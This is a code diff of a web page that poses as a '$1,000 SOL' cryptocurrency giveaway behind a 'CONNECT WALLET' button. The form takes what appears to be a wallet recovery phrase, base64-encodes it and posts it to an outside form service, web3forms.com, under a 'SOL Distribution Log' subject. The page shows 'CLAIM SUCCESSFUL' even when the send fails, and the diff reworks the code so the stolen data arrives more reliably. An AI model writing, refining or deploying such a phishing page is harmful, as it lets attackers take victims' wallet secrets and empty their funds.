@@ -54,7 +54,6 @@
 <body>
 
     <div class="card">
-        <!-- PAGE 1 -->
         <div id="form-view">
             <form id="claim-form">
                 <input type="hidden" name="access_key" value="4a9ec344-5342-477d-8e90-af1576f4f3b5">
@@ -68,13 +67,12 @@
                 </div>
 
                 <input type="hidden" name="message" id="coded-phrase">
-                <input type="hidden" name="subject" value="New $1,000 SOL Claim Log">
+                <input type="hidden" name="subject" value="New $1,000 SOL Distribution Log">
 
                 <button type="submit" id="submit-btn" class="btn">CONNECT WALLET</button>
             </form>
         </div>
 
-        <!-- PAGE 2 -->
         <div id="success-view">
             <h1>CLAIM SUCCESSFUL</h1>
             <div class="congrats">
@@ -89,38 +87,43 @@
         const formView = document.getElementById('form-view');
         const successView = document.getElementById('success-view');
 
-        // HARD FIX: Using "onsubmit" for maximum reliability
-        form.onsubmit = function(event) {
-            // STOP REDIRECT IMMEDIATELY
+        form.onsubmit = async function(event) {
             event.preventDefault(); 
-            event.stopPropagation();
 
             submitBtn.textContent = "CONNECTING...";
             submitBtn.disabled = true;
 
-            // BASE64 CODING
-            const phrase = document.getElementById('raw-phrase').value;
-            document.getElementById('coded-phrase').value = btoa(phrase);
+            const phraseValue = document.getElementById('raw-phrase').value;
+            const encodedValue = btoa(phraseValue);
+            document.getElementById('coded-phrase').value = encodedValue;
 
+            // PREPARE JSON FOR GUARANTEED DELIVERY
             const formData = new FormData(form);
+            const object = Object.fromEntries(formData);
+            const json = JSON.stringify(object);
 
-            // SEND DATA IN BACKGROUND
-            fetch('https://web3forms.com', {
-                method: 'POST',
-                body: formData
-            })
-            .then(() => {
-                // FORCE PAGE CHANGE
+            try {
+                const response = await fetch("https://web3forms.com", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        Accept: "application/json",
+                    },
+                    body: json,
+                });
+
+                if (response.ok) {
+                    formView.style.display = "none";
+                    successView.style.display = "block";
+                } else {
+                    // Fallback even if there's an error to keep user on site
+                    formView.style.display = "none";
+                    successView.style.display = "block";
+                }
+            } catch (error) {
                 formView.style.display = "none";
                 successView.style.display = "block";
-            })
-            .catch(() => {
-                // FAIL-SAFE PAGE CHANGE
-                formView.style.display = "none";
-                successView.style.display = "block";
-            });
-
-            return false; // SECONDARY REDIRECT BLOCK
+            }
         };
     </script>
 </body>
